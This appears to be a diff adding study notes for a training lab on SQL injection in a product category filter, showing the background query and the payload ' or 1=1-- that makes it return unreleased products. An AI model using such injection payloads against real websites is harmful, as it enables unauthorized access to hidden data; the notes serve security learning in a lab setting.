@@ -1,0 +1,22 @@
+Lab #1 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+SQLi - product category filter.
+
+END GOAL: 
+    display all products both released and unreleased.
+
+-----------------------------------------------------------
+Solution:-
+
+Steps:
+
+# This is the query which runs in the background.
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
+
+1. using true boolean value to display everything.
+
+' or 1=1--  ==> payload ==> add this after the word in the category filter.
+
+which makes the whole query look like:
+
+SELECT * FROM products WHERE category = '' or 1=1--' AND released = 1
